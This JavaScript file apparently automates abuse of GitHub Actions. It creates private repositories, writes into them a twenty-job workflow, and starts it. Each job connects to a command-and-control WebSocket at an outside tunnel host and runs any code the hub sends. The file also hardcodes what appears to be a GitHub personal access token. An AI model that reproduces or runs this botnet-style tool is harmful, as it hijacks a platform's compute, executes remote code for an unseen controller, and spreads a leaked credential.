const https = require('https');
const crypto = require('crypto');

const TOKEN = process.env.GITHUB_TOKEN || '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';
const COLONY_PREFIX = 'limitless-swarm-colony-';

function fetchAPI(path, method = 'GET', body = null) {
    return new Promise((resolve, reject) => {
        const options = {
            hostname: 'api.github.com',
            path: path,
            method: method,
            headers: {
                'Authorization': `Bearer ${TOKEN}`,
                'Accept': 'application/vnd.github+json',
                'X-GitHub-Api-Version': '2022-11-28',
                'User-Agent': 'Swarm-Colony-Expander'
            }
        };

        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                if (res.statusCode >= 200 && res.statusCode < 300) {
                    try { resolve(JSON.parse(data || '{}')); } catch(e) { resolve(data); }
                } else {
                    reject(`API Error ${res.statusCode}: ${data}`);
                }
            });
        });
        
        req.on('error', reject);
        if (body) req.write(JSON.stringify(body));
        req.end();
    });
}

async function expandColony() {
    try {
        const colonyName = COLONY_PREFIX + crypto.randomBytes(4).toString('hex');
        console.log(`[COLONY EXPANSION] Initiating resource acquisition: ${colonyName}`);

        // 1. Create Repository
        console.log(`[COLONY EXPANSION] Forging new repository...`);
        const repo = await fetchAPI('/user/repos', 'POST', {
            name: colonyName,
            description: 'Automated Swarm Compute Colony',
            private: true,
            auto_init: true
        });
        console.log(`[COLONY EXPANSION] Repository forged: ${repo.full_name}`);

        // 2. Create Workflow File
        console.log(`[COLONY EXPANSION] Injecting matrix compute workflow...`);
        const workflowYaml = `
name: Global Compute Acquisition Array
on: [workflow_dispatch]
jobs:
  compute-node:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        node: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
    steps:
    - name: Setup Node.js
      uses: actions/setup-node@v3
      with:
        node-version: '18'
    - name: Install Dependencies
      run: npm install ws
    - name: Connect to C2 Hub
      run: |
        cat << 'EOF' > headless_node.js
        const WebSocket = require('ws');
        const { Worker } = require('worker_threads');
        // Nodes will use a fallback or an environment variable for the Hub URL
        const url = process.env.HUB_URL || 'wss://tall-poems-begin.loca.lt';
        
        function connect() {
          const ws = new WebSocket(url, { headers: { 'Bypass-Tunnel-Reminder': 'true' } });
          ws.on('open', () => {
            ws.send(JSON.stringify({ type: 'NODE_CONNECT', nodeType: 'COLONY_RUNNER' }));
          });
          ws.on('message', (data) => {
            const msg = JSON.parse(data);
            if (msg.type === 'DISPATCH_SWARM_TASK') {
              const workerCode = \`
                const { parentPort } = require('worker_threads');
                const self = { postMessage: (data) => parentPort.postMessage(data) };
                \${msg.code}
                if (typeof self.onmessage === 'function') self.onmessage({ data: { type: 'START' } });
              \`;
              const worker = new Worker(workerCode, { eval: true });
              worker.on('message', (result) => {
                ws.send(JSON.stringify({ type: 'TASK_RESULT', taskId: msg.taskId, result: result }));
                worker.terminate();
              });
            }
          });
          ws.on('close', () => setTimeout(connect, 5000));
          ws.on('error', () => {});
        }
        connect();
        setTimeout(() => {}, 6 * 60 * 60 * 1000);
        EOF
        node headless_node.js
      env:
        MATRIX_NODE: \${{ matrix.node }}
`;
        const encodedContent = Buffer.from(workflowYaml.trim()).toString('base64');
        
        await fetchAPI(`/repos/${repo.full_name}/contents/.github/workflows/colony-node.yml`, 'PUT', {
            message: 'Initialize Colony Workflow',
            content: encodedContent
        });

        console.log(`[COLONY EXPANSION] Workflow injected successfully.`);

        // 3. Trigger the new Workflow
        console.log(`[COLONY EXPANSION] Igniting new matrix burst (Acquiring 20 additional nodes)...`);
        await new Promise(r => setTimeout(r, 2000)); // wait for Github to register the file
        await fetchAPI(`/repos/${repo.full_name}/actions/workflows/colony-node.yml/dispatches`, 'POST', {
            ref: 'main'
        });

        console.log(`[COLONY EXPANSION] Success! The Swarm has multiplied. +20 Compute Nodes acquired.`);

    } catch (e) {
        console.error(`[COLONY EXPANSION] Critical failure:`, e);
    }
}

expandColony();
